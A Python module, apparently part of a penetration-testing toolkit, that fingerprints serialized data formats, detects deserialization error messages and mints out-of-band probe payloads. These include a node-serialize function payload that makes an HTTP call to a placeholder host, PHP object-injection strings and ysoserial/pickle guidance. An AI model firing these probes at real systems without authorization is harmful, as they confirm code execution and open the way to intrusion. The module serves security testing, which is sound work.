"""Insecure-deserialization primitive — recognize a serialized blob's FORMAT, mint benign
detection/OOB payloads for that stack, and flag deserialization tells in a response. Deserialization
RCE is stack-specific (Java/PHP/Python/Ruby/.NET/Node), so the leverage is (1) fingerprinting the
format from the blob you found (cookie, hidden field, API param) and (2) handing back the right
probe. Confirmation is OOB (a gadget that makes the server call home) — pair with the `oob` tool;
we mint benign probes only, never a real RCE gadget chain.

ponytail: fingerprint + benign-probe + error-signature detection. Weaponized Java gadget chains need
ysoserial (a gadget-selection problem, not a payload-format one) — note it and hand off; do not ship
a live RCE payload from here.
"""
import base64
import re

# format fingerprints from the raw (or base64-decoded) blob's leading bytes/shape.
_SIGS = [
    ("java", re.compile(rb"^\xac\xed\x00\x05")),                  # Java serialized stream magic
    ("java-b64", re.compile(rb"^rO0AB")),                        # base64 of \xac\xed\x00\x05
    ("php", re.compile(rb'^[aOs]:\d+:|^a:\d+:\{')),              # PHP serialize()
    ("python-pickle", re.compile(rb"^\x80\x04|^\x80\x03|^\(dp|^cposix")),
    ("dotnet", re.compile(rb"^AAEAAAD|BinaryFormatter", re.I)),  # .NET BinaryFormatter (base64)
    ("ruby-marshal", re.compile(rb"^\x04\x08|^BAg")),            # Ruby Marshal (raw / base64 'BAg')
    ("node-serialize", re.compile(rb'_\$\$ND_FUNC\$\$_|\{"rce"', re.I)),
    ("json", re.compile(rb'^\s*[\{\[]')),
]
_ERROR_TELL = re.compile(
    r"unserialize|deserializ|__wakeup|__destruct|ObjectInputStream|readObject|"
    r"pickle|marshal|BinaryFormatter|yaml\.load|SnakeYAML|InvalidClassException|"
    r"unexpected end of|cannot unserialize|_\$\$ND_FUNC", re.I)


def fingerprint(blob: str) -> str:
    """Best-guess serialization format of a blob (raw or base64). '' if it looks like plain data."""
    if not blob:
        return ""
    raw = blob.encode("utf-8", "replace")
    for name, sig in _SIGS:
        if sig.search(raw):
            return name.replace("-b64", "")
    try:
        dec = base64.b64decode(blob, validate=False)
        for name, sig in _SIGS:
            if sig.search(dec):
                return name.replace("-b64", "")
    except Exception:
        pass
    return ""


def probes(fmt: str, oob_url: str = "") -> list:
    """Benign detection/OOB probes for a format. RCE-capable chains (Java) are intentionally NOT
    minted here — they need ysoserial gadget selection; we return the guidance instead."""
    o = oob_url or "http://YOUR-OOB"
    P = {
        "php": [("php object-injection probe",
                 'O:8:"stdClass":1:{s:1:"x";s:5:"probe";}  # if a magic method (__wakeup/__destruct) '
                 'exists on an autoloadable class, swap stdClass for it; blind-confirm via a class '
                 'whose destructor makes an HTTP call to ' + o)],
        "python-pickle": [("pickle OOB probe (benign)",
                 "base64 of: pickle that calls a benign urllib.urlopen('" + o + "') via __reduce__ "
                 "(prove code-exec out-of-band with the oob tool; do NOT run a shell payload)")],
        "node-serialize": [("node-serialize IIFE probe",
                 '{"rce":"_$$ND_FUNC$$_function(){require(\'http\').get(\'' + o + '\')}()"}  '
                 "(node-serialize runs the function on unserialize -> blind OOB)")],
        "ruby-marshal": [("ruby Marshal note",
                 "Marshal.load on attacker data is RCE via a universal gadget (e.g. Gem/Net::Write); "
                 "confirm OOB against " + o + " — mint with a Ruby one-liner, keep it benign")],
        "java": [("java note (needs ysoserial)",
                 "Java deserialization RCE needs a gadget chain from ysoserial (URLDNS for a pure-OOB "
                 "DNS confirmation is the safe first probe): ysoserial URLDNS '" + o + "' | base64")],
        "dotnet": [(".NET note",
                 "BinaryFormatter/LosFormatter RCE via ysoserial.net (TypeConfuseDelegate); OOB-confirm "
                 "first. Mint externally; do not run a live gadget from here.")],
        "json": [("looks like JSON, not a serialized object",
                 "if the app deserializes it into typed objects (Jackson polymorphic, PyYAML), test "
                 "type-confusion; otherwise this is not a deserialization sink")],
    }
    return P.get(fmt, [("unknown format", "could not fingerprint — capture the raw blob (cookie/"
                        "hidden field/param) and re-run; base64-decode first if it looks encoded")])


def detect(response_text: str) -> str:
    m = _ERROR_TELL.search(response_text or "")
    return m.group(0) if m else ""


def run(sb, args: dict) -> str:
    blob = args.get("blob") or ""
    oob_url = args.get("oob_url") or ""
    fmt = args.get("format") or fingerprint(blob)
    lines = [f"DESERIALIZE — format: {fmt or 'UNKNOWN (capture the raw blob)'}"]
    for name, guidance in probes(fmt, oob_url):
        lines.append(f"  [{name}] {guidance}")
    # if a response sample was provided, flag deserialization error signatures
    resp = args.get("response") or ""
    if resp:
        tell = detect(resp)
        lines.append(f"  response tell: {'‼ '+tell+' (deserialization sink likely)' if tell else 'none'}")
    lines.append("  CONFIRM blind deserialization OUT-OF-BAND (oob tool). Do NOT run a live RCE gadget; "
                 "prove the class (OOB callback / error) and report.")
    return "\n".join(lines)


def demo() -> None:
    import base64 as b
    assert fingerprint(b.b64encode(b"\xac\xed\x00\x05test").decode()) == "java"
    assert fingerprint('O:8:"stdClass":0:{}') == "php"
    assert fingerprint(b.b64encode(b"\x80\x04pickledata").decode()) == "python-pickle"
    assert fingerprint("BAgabc") == "ruby-marshal"          # 'BAg' = base64 of \x04\x08
    assert fingerprint('{"rce":"x"}') in ("node-serialize", "json")   # rce marker wins
    assert fingerprint("just plain text") == ""
    assert fingerprint("") == ""
    # probes are format-specific
    assert any("object-injection" in n for n, _ in probes("php"))
    assert any("ysoserial" in g for _, g in probes("java"))  # java guidance mentions ysoserial
    # error tell detection
    assert detect("Fatal: unserialize(): error at offset 0") == "unserialize"
    assert detect("200 OK all good") == ""
    print("deserialize.py ok")


if __name__ == "__main__":
    demo()
